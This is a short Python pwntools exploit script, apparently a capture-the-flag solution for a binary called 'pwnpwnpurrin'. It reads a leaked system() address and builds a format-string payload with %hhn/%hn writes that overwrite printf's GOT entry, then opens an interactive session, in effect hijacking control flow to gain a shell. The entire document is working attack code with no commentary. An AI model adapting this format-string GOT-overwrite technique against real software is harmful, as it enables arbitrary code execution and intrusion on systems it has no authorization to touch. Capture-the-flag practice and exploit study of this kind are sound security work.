from pwn import *

elf = ELF('./pwnpwnpurrin')

local = True

if local:
    io = elf.process()
else:
    io = remote("", 6969)


io.recvuntil(b'here: ')

leak = int(io.recvline(), 16)
printf_got = elf.got['printf']

info(f"system leak : {hex(leak)}")
info(f"printf got : {hex(printf_got)}")
obyte = (leak >> 16 )  & 0xff
obyte_pad = (8 - len(str(obyte)) - 2)
info(f"ini obyte {hex(obyte)}")
val1 = obyte - obyte_pad
info(f"obyte pad: {obyte_pad}")
info(f"val: {val1}")

tbytes = (leak & 0xffff)
tbytes_pad = (8 - len(str(tbytes)) - 2)
val2 = tbytes - (obyte + 1 + tbytes_pad)

pld = b""
pld += f"%{val1}p".encode().ljust(8, b'\x41')
pld += b"%10$hhn-"
pld += f"%{val2}p".encode().ljust(8, b'\x41')
pld += b"%11$hn--"
pld += p64(printf_got + 2)
pld += p64(printf_got)

info(f"pld = {pld}")
#raw_input("?")


io.sendline(pld)

io.interactive()
